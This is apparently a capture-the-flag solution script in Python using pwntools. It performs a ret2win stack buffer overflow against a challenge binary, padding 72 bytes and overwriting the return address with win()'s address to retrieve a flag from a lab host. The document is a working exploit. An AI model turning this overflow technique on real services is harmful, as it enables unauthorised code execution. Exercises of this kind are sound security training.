#!/usr/bin/env python3
"""ret2win exploit.

布局（x86-64）：
    char buf[64]  ->  rbp-0x40
    saved rbp     ->  8 字节
    return addr   ->  offset = 64 + 8 = 72

用法：
    python3 exp.py                 # 打远程（改下面的 HOST/PORT）
    python3 exp.py --local ./vuln  # 本地调试
"""

import argparse
import sys

from pwn import ELF, context, log, p64, process, remote

context.log_level = "info"
context.arch = "amd64"

HOST = "172.26.50.78"
PORT = 30021          # 平台实例页显示的 NodePort
BINARY = "./vuln"     # 与题目镜像里编译出来的二进制一致


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", metavar="PATH", help="本地二进制路径")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()

    elf = ELF(args.local or BINARY, checksec=False)
    win = elf.symbols["win"]
    log.info("win() = %#x", win)

    if args.local:
        io = process([args.local])
    else:
        io = remote(args.host, args.port)

    io.recvuntil(b"payload> ")
    payload = b"A" * 72 + p64(win)
    io.send(payload + b"\n")

    data = io.recvall(timeout=5)
    sys.stdout.write(data.decode("utf-8", "replace"))
    return 0 if b"flag{" in data else 1


if __name__ == "__main__":
    raise SystemExit(main())
